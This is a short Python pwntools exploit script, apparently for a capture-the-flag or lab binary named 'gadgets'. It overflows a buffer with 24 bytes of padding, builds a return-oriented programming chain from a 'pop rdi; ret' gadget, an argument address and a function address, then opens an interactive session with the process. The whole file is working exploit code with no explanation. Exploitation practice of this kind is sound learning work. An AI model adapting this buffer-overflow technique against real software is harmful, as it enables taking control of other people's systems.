from pwn import *

p = process("./gadgets")
p = gdb.debug("./gadgets",'b main')
p.recvuntil("seconds.")
payload = "A"*24
payload+=p64(0x00000000004005ba) #pop rdi;ret;
payload+=p64(0x0000000000601060) #1st arg
payload+=p64(0x0000000000400470)

p.sendline(payload)
p.interactive()

